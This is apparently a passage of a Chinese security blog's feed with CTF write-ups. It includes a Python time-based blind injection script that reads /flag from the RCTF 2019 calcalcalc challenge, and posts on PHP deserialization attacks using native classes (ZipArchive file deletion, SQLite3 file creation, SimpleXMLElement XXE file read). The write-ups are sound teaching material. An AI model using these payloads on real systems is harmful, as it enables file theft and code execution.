plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1//1 and (ord(open(&quot;/flag&quot;).read()[0])==1) and set(1 for i in range(10000000))</span><br></pre></td></tr></table></figure></p><p>这样在php和nodejs中，只会剩下1，而在python中剩下的却是整个exp。这样一来我们可以避免nodejs或者php的crash等时延因素，单纯靠python进行时间延迟注入，带出数据。所以Bypass exp可以为:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">transfer</span><span class="params">(s)</span>:</span></span><br><span class="line">    ss = <span class="string">"+"</span>.join([<span class="string">"chr(&#123;&#125;)"</span>.format(ord(i)) <span class="keyword">for</span> i <span class="keyword">in</span> s])</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"eval(&#123;&#125;)"</span>.format(ss)</span><br><span class="line"></span><br><span class="line">cat_flag = transfer(<span class="string">'open("/flag").read()'</span>)</span><br><span class="line"></span><br><span class="line">url = <span class="string">"https://calcalcalc.2019.rctf.rois.io/calculate"</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">  <span class="string">'Content-Type'</span>: <span class="string">"application/json"</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">base = <span class="string">"1//1 and not (ord(&#123;&#125;[&#123;&#125;]) - &#123;&#125;) and set(1 for i in range(1000000000))"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(exp, cnt=<span class="number">0</span>)</span>:</span></span><br><span class="line">    payload = <span class="string">"&#123;\n\t\"expression\": \""</span> + exp + <span class="string">"\",\n\t\"isVip\": true\n&#125;"</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url, data=payload, headers=headers, timeout=<span class="number">0.5</span>)</span><br><span class="line">        print(response.text)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">if</span> cnt &lt; <span class="number">5</span>:</span><br><span class="line">            time.sleep(<span class="number">3</span>)</span><br><span class="line">            <span class="keyword">return</span> test(exp, cnt+<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">"RCTF&#123;watch_Kemurikusa_to_c4lm_d0wn&#125;"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag), <span class="number">36</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">127</span>,<span class="number">31</span>, <span class="number">-1</span>):</span><br><span class="line">        print(<span class="string">"flag &#123;&#125; &#123;&#125;"</span>.format(i, j))</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        exp = base.format(cat_flag, i, j)</span><br><span class="line">        <span class="keyword">if</span> test(exp):</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> j == <span class="number">32</span>:</span><br><span class="line">        flag += <span class="string">'?'</span></span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本坑开的好久了= =，但一直太忙了，现在已经是7月了，都想不起来还有啥题了，只把坑先填上了~&lt;/p&gt;
&lt;h2 id=&quot;nextphp&quot;&gt;&lt;a
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Summary of serialization attacks &amp; Part 2</title>
    <link href="http://skysec.top/2019/05/05/Summary-of-serialization-attacks-Part-2/"/>
    <id>http://skysec.top/2019/05/05/Summary-of-serialization-attacks-Part-2/</id>
    <published>2019-05-05T13:37:31.000Z</published>
    <updated>2019-05-27T23:56:24.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前写了一篇介绍序列化概念和两种常见攻击：1.魔法方法，2.session序列化引擎。<br>本篇文章继续深入，介绍另外方法：原生类序列化问题。</p><h2 id="原生类同名函数"><a href="#原生类同名函数" class="headerlink" title="原生类同名函数"></a>原生类同名函数</h2><h3 id="问题引入"><a href="#问题引入" class="headerlink" title="问题引入"></a>问题引入</h3><p>什么是原生类同名函数攻击漏洞呢？我们不妨看如下代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UploadFile</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($fakename, $content)</span> </span>&#123;</span><br><span class="line">        ..... <span class="comment">// 你什么也不能做</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span><span class="params">($fakename, $realname)</span> </span>&#123;</span><br><span class="line">        ..... <span class="comment">// 你什么也不能做</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>假设有这样一个上传类，但是因为有.htaccess文件的控制，上传文件夹被限制的很死，我们很难上传我们的一句话文件。唯一的突破口是利用类中的函数或者漏洞，删除.htaccess文件，否则即便上传了一句话文件，也不能被解析。</p><h3 id="问题探索"><a href="#问题探索" class="headerlink" title="问题探索"></a>问题探索</h3><p>但是纵观类中函数，没有一个具有删除或者覆盖功能，此时应该如何操作呢？此时便应该考虑一下是否有原生类具有同名函数。比如此处的open函数，我们可以通过php代码进行搜索：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">foreach</span> (get_declared_classes() <span class="keyword">as</span> $class) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (get_class_methods($class) <span class="keyword">as</span> $method) &#123;</span><br><span class="line">      <span class="keyword">if</span> ($method == <span class="string">"open"</span>)</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"$class-&gt;$method\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>不难得到如下结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SQLite3-&gt;open</span><br><span class="line">SessionHandler-&gt;open</span><br><span class="line">XMLReader-&gt;open</span><br><span class="line">ZipArchive-&gt;open</span><br></pre></td></tr></table></figure></p><p>发现有4个php原生类带有open方法，我们查阅每个方法的实现。</p><h3 id="方法实现探究"><a href="#方法实现探究" class="headerlink" title="方法实现探究"></a>方法实现探究</h3><p>对于SQLite3-&gt;open，我们查阅官方手册：<br><img src="/images/2019-05-06-11-27-06.png" alt=""><br>其有3个参数，看到模式SQLITE3_OPEN_READWRITE，应该不难想到是否可以篡改.htaccess，我们测试一下，得到报错：<br><img src="/images/2019-05-06-11-30-23.png" alt=""><br>显然这里的open方法并不能直接调用，我们继续往下看。<br>对于SessionHandler-&gt;open，我们查阅官方手册：<br><img src="/images/2019-05-06-11-31-48.png" alt=""><br>其有两个参数，一个是保存session的位置，一个是session的名字，很显然在这里不太适用，我们继续往下看。<br>对于XMLReader-&gt;open，我们查阅官方手册：<br><img src="/images/2019-05-06-11-33-18.png" alt=""><br>该方法也有3个参数，但显然也与删除文件没有太大关联，对我们的漏洞利用帮助不大，所以也可以直接跳过。<br>最后对于ZipArchive-&gt;open，我们查阅官方手册：<br><img src="/images/2019-05-06-10-37-16.png" alt=""><br>发现其参数为2个，前者是文件名，后者是选择模式，这里有一个overwrite非常引人注目，这正是我们需求的模式。我们跟进查看该模式描述：<br><img src="/images/2019-05-06-10-41-47.png" alt=""><br>本地测试一下：<br><img src="/images/2019-05-06-10-44-29.png" alt=""><br>发现使用该模式，可以成功删除指定文件。<br>那么如果目标操作序列化中，存在open调用，同时序列化可控，就有可能进行覆盖，达到删除指定文件的目的。例如题目中的<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">open</span><span class="params">($fakename, $realname)</span> </span>&#123;</span><br><span class="line">       ..... <span class="comment">// 你什么也不能做</span></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p><p>我们可以让fakename为.htaccess，realname为ZipArchive::OVERWRITE，并控制序列化为ZipArchive对象，即可达成删除目的。<br>上述过程并非凭空想象出来的环境，在一次比赛中便用到了这样的方式，在比赛Insomnihack Teaser 2018中，File Vault一题的考察点便在于此。有兴趣的可以看这篇文章:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://corb3nik.github.io/blog/insomnihack-teaser-2018/file-vault</span><br></pre></td></tr></table></figure></p><h2 id="原生类魔法方法"><a href="#原生类魔法方法" class="headerlink" title="原生类魔法方法"></a>原生类魔法方法</h2><p>我们知道这种情况比较少数，因为需要程序去调用函数，并且其中同名的概率也是比较低的。所以不难联系到之前的魔法方法，这类方法可以在满足条件的情况下自动触发。如果我们能挖掘原生类中魔法方法的利用点，那么攻击范围肯定是明显大于上述这种需要调用的同名方法的。</p><h3 id="原生类探索"><a href="#原生类探索" class="headerlink" title="原生类探索"></a>原生类探索</h3><p>那么不妨列举出所有带有魔法方法的原生类：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">$classes = get_declared_classes();</span><br><span class="line"><span class="keyword">foreach</span> ($classes <span class="keyword">as</span> $class) &#123;</span><br><span class="line">    $methods = get_class_methods($class);</span><br><span class="line">    <span class="keyword">foreach</span> ($methods <span class="keyword">as</span> $method) &#123;</span><br><span class="line">        <span class="keyword">if</span> (in_array($method, <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'__construct'</span>,</span><br><span class="line">            <span class="string">'__destruct'</span>,</span><br><span class="line">            <span class="string">'__toString'</span>,</span><br><span class="line">            <span class="string">'__wakeup'</span>,</span><br><span class="line">            <span class="string">'__call'</span>,</span><br><span class="line">            <span class="string">'__callStatic'</span>,</span><br><span class="line">            <span class="string">'__get'</span>,</span><br><span class="line">            <span class="string">'__set'</span>,</span><br><span class="line">            <span class="string">'__isset'</span>,</span><br><span class="line">            <span class="string">'__unset'</span>,</span><br><span class="line">            <span class="string">'__invoke'</span>,</span><br><span class="line">            <span class="string">'__set_state'</span></span><br><span class="line">        ))) &#123;</span><br><span class="line">            <span class="keyword">print</span> $class . <span class="string">'::'</span> . $method . <span class="string">"\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>运行后不难发现，这里就有前一篇文章我们说的原生类SoapClient魔法方法__call导致SSRF的问题：<br><img src="/images/2019-05-06-12-18-07.png" alt=""><br>当然这么多原生类中，肯定不止这一个魔法方法可以利用。</p><h3 id="SQLite3"><a href="#SQLite3" class="headerlink" title="SQLite3"></a>SQLite3</h3><p>例如原生类SQLite3，我们在遍历的时候，发现其存在魔法方法：SQLite3::__construct。<br>我们查阅一下官方手册：<br><img src="/images/2019-05-06-15-04-09.png" alt=""><br>此处可以发现，刚方法可以创建一个指定名称指定路径的空白文件：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$sky=<span class="keyword">new</span> SQLite3(<span class="string">'/tmp/sky/evil.php'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-05-06-15-06-27.png" alt=""><br>我们可以发现成功创建evil.php，可以有一个可控文件非常重要，我们可以用其存储数据，或是进行evil code的填写，方便后续攻击。</p><h3 id="DirectoryIterator"><a href="#DirectoryIterator" class="headerlink" title="DirectoryIterator"></a>DirectoryIterator</h3><p>又如原生类DirectoryIterator，我们注意到在遍历魔法方法时，其存在如下两个魔法方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DirectoryIterator::__construct</span><br><span class="line">DirectoryIterator::__toString</span><br></pre></td></tr></table></figure></p><p>我们查阅官方手册：<br><img src="/images/2019-05-06-15-13-04.png" alt=""><br><img src="/images/2019-05-06-15-13-17.png" alt=""><br>发现两者可以结合使用，首先使用魔法方法<strong>construct进行路径选择，再利用</strong>toString返回对应路径下的内容：<br><img src="/images/2019-05-06-15-15-18.png" alt=""><br>原理也很清晰，在使用echo的时候，触发了__toString魔法方法，返回了当前路径下的文件名。</p><h3 id="SimpleXMLElement"><a href="#SimpleXMLElement" class="headerlink" title="SimpleXMLElement"></a>SimpleXMLElement</h3><p>再如SimpleXMLElement，我们在遍历魔法方法的时候，也发现了其存在2种魔法方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SimpleXMLElement::__construct</span><br><span class="line">SimpleXMLElement::__toString</span><br></pre></td></tr></table></figure></p><p>我们同样去查阅官方手册：<br><img src="/images/2019-05-06-15-26-22.png" alt=""><br><img src="/images/2019-05-06-15-26-37.png" alt=""><br>这里相信大家都不陌生，看到xml肯定会想到xxe，这里也不例外，该原生类可以用来进行xxe任意文件读取。如下图：<br><img src="/images/2019-05-06-15-26-08.png" alt=""><br>在利用echo后会触发__toString()魔法方法，输出其中的值，但需要注意的是，这里需要options为LIBXML_NOENT，否则不会加载我们的实体：<br><img src="/images/2019-05-06-15-28-30.png" alt=""></p><h3 id="实际案例"><a href="#实际案例" class="headerlink" title="实际案例"></a>实际案例</h3><p>上述了多个原生类的利用点，实际上他们都来自于一场真实的案例，原文如下：<br><a href="https://5haked.blogspot.com/2016/10/how-i-hacked-pornhub-for-fun-and-profit.html" target="_blank" rel="noopener">https://5haked.blogspot.com/2016/10/how-i-hacked-pornhub-for-fun-and-profit.html</a><br>该牛串联多个原生类序列化问题，最后成功对某知名网站的任意代码执行，有兴趣的可以好好拜读一下~</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>本篇文章是前一篇的进阶版，后续有机会将更加结合实际问题进行剖析，欢迎有骚操作的一起讨论！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发于嘶吼</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;之前写了一篇介绍序列化概念和两种常见攻击：1.魔法方法，2.session序列化引擎。&lt;br&gt;本篇文章继续深入，介绍另外方法：原生类序列化问
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Summary of serialization attacks &amp; Part 1</title>
    <link href="http://skysec.top/2019/05/05/Summary%20of%20serialization%20attacks%20&amp;%20Part%201/"/>
    <id>http://skysec.top/2019/05/05/Summary of serialization attacks &amp; Part 1/</id>
    <published>2019-05-05T01:28:38.000Z</published>
    <updated>2019-06-24T12:01:00.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>近期因为内部培训有序列化的需求，于是趁此机会由浅入深的剖析一下序列化相关内容。<br>之前也写过由浅入深的xml漏洞系列，欢迎阅读：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://skysec.top/2018/08/17/浅析xml及其安全问题/</span><br><span class="line">https://skysec.top/2018/08/18/浅析xml之xinclude-xslt/</span><br></pre></td></tr></table></figure></p><h2 id="序列化的概念"><a href="#序列化的概念" class="headerlink" title="序列化的概念"></a>序列化的概念</h2><p>简单概括来说，序列化即保存对象在内存中的状态，也可以说是实例化变量。在传递一个对象的时候，或是需要把对象保存在文件/数据库中时，就必须用序列化。</p><h2 id="序列化样例"><a href="#序列化样例" class="headerlink" title="序列化样例"></a>序列化样例</h2><p>以php官方手册样例为例：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SimpleClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// 声明属性</span></span><br><span class="line">    <span class="keyword">public</span> $var = <span class="string">'a default value'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 声明方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">displayVar</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;var;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>这样一来我们写了一个简单的类样例，类中包含一个属性和一个方法。<br>我们可以通过如下方式对类的属性进行赋值，对类的方法进行调用：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sky = <span class="keyword">new</span> SimpleClass();</span><br><span class="line">$sky-&gt;var = <span class="string">'sky is cool!'</span>;</span><br><span class="line">$sky-&gt;displayVar();</span><br></pre></td></tr></table></figure></p><p>我们观察一下序列化后字符串的格式：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sky = serialize($sky);</span><br><span class="line">var_dump($sky);</span><br></pre></td></tr></table></figure></p><p>得到如下内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:11:&quot;SimpleClass&quot;:1:&#123;s:3:&quot;var&quot;;s:12:&quot;sky is cool!&quot;;&#125;</span><br></pre></td></tr></table></figure></p><p>O代表存储的是对象（object），11表示对象的名称有11个字符，”SimpleClass”表示对象的名称，1表示有一个值。<br>大括号内s表示字符串，3表示该字符串的长度，”var”为字符串的名称，紧跟着是该字符串的值，规则同理。<br>相同的，如果序列化数组，得到结果如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$sky1 = <span class="keyword">new</span> SimpleClass();</span><br><span class="line">$sky1-&gt;var = <span class="string">'sky is cool!'</span>;</span><br><span class="line">$sky2 = <span class="keyword">new</span> SimpleClass();</span><br><span class="line">$sky2-&gt;var = <span class="string">'wq is cool!'</span>;</span><br><span class="line">$sky3 = <span class="keyword">new</span> SimpleClass();</span><br><span class="line">$sky3-&gt;var = <span class="string">'sy is cool!'</span>;</span><br><span class="line">$sky4 = <span class="keyword">array</span>($sky1,$sky2,$sky3);</span><br><span class="line">var_dump(serialize($sky4));</span><br></pre></td></tr></table></figure></p><p>得到如下内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:3:&#123;i:0;O:11:&quot;SimpleClass&quot;:1:&#123;s:3:&quot;var&quot;;s:12:&quot;sky is cool!&quot;;&#125;i:1;O:11:&quot;SimpleClass&quot;:1:&#123;s:3:&quot;var&quot;;s:11:&quot;wq is cool!&quot;;&#125;i:2;O:11:&quot;SimpleClass&quot;:1:&#123;s:3:&quot;var&quot;;s:11:&quot;sy is cool!&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure></p><p>与之前不同的，多了a和i，a表示数组，数字3表示数组中有3个元素，i:0表示第一个元素，i:1表示第二个元素，i:2表示第三个元素。其他规则与之前一致。<br>相应的，将这组字符串传递后，我们接受后，使用unserialize()进行反序列化，如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$sky1 = <span class="string">'a:3:&#123;i:0;O:11:"SimpleClass":1:&#123;s:3:"var";s:12:"sky is cool!";&#125;i:1;O:11:"SimpleClass":1:&#123;s:3:"var";s:11:"wq is cool!";&#125;i:2;O:11:"SimpleClass":1:&#123;s:3:"var";s:11:"sy is cool!";&#125;&#125;'</span>;</span><br><span class="line">$sky2 = <span class="string">'O:11:"SimpleClass":1:&#123;s:3:"var";s:12:"sky is cool!";&#125;'</span>;</span><br><span class="line">var_dump(unserialize($sky1));</span><br><span class="line">var_dump(unserialize($sky2));</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-05-05-09-56-53.png" alt=""><br>发现反序列化成功，我们已将之前存储的对象成功复原。</p><h2 id="魔法方法漏洞"><a href="#魔法方法漏洞" class="headerlink" title="魔法方法漏洞"></a>魔法方法漏洞</h2><h3 id="魔法方法样例"><a href="#魔法方法样例" class="headerlink" title="魔法方法样例"></a>魔法方法样例</h3><p>了解之前的原理后，我们首先看一个最简单的反序列化漏洞：<br><img src="/images/2019-05-05-10-01-44.png" alt=""><br>还是之前的代码，我们发现最后我们并没有进行方法调用，但成功触发了__toString()方法，这就是魔法方法的魅力。<br>魔法方法往往不需要用户调用，在特定条件下会自动触发，相关魔法方法在php官方手册中写的非常清楚了，就不再赘述：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.php.net/manual/zh/language.oop5.magic.php</span><br></pre></td></tr></table></figure></p><p>这里的<strong>toString方法之所以触发成功，是因为我们将对象当做字符串输出，符合</strong>toString方法的条件，所以成功触发了该方法。如果将echo换成var_dump则不会触发该方法。</p><h3 id="魔法方法实战（一）"><a href="#魔法方法实战（一）" class="headerlink" title="魔法方法实战（一）"></a>魔法方法实战（一）</h3><p>例如在Jarvis OJ上的一题:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web.jarvisoj.com:32768</span><br></pre></td></tr></table></figure></p><p>index.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'shield.php'</span>);</span><br><span class="line">$x = <span class="keyword">new</span> Shield();</span><br><span class="line"><span class="keyword">isset</span>($_GET[<span class="string">'class'</span>]) &amp;&amp; $g = $_GET[<span class="string">'class'</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($g)) &#123;</span><br><span class="line">$x = unserialize($g);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $x-&gt;readfile();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>shield.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in pctf.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> $file;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span> -&gt; file = $filename;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readfile</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file) &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'..'</span>)===<span class="keyword">FALSE</span>  </span><br><span class="line">&amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'\\'</span>)==<span class="keyword">FALSE</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> @file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>我们可以看到是一个非常简单的类，其中定义了1个属性和2个方法，其中便有魔法方法<strong>construct()，通过查阅官方手册我们知道：具有构造函数的类会在每次创建新对象时先调用此方法。所以刚方法在初始化的时候便会自动调用，那么这里要涉及一个先后顺序，是我们赋值先进行，还是</strong>construct()先进行，这里做一个简单测试：<br><img src="/images/2019-05-05-10-15-32.png" alt=""><br>从该测试不难看出，在new的时候__construct()已经出发，下一次赋值后即可将var属性覆盖。<br>回到题目中，在反序列化后，题目进行了如下调用<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> $x-&gt;readfile();</span><br></pre></td></tr></table></figure></p><p>而该方法有任意文件读取问题<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readfile</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file) &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'..'</span>)===<span class="keyword">FALSE</span>  </span><br><span class="line">&amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'\\'</span>)==<span class="keyword">FALSE</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> @file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>所以答案也呼之欲出了，我们将file的值赋值为pctf.php即可getflag，需要注意的是我们的赋值是在魔法方法__construct()之后，所以并不会被置空。</p><h3 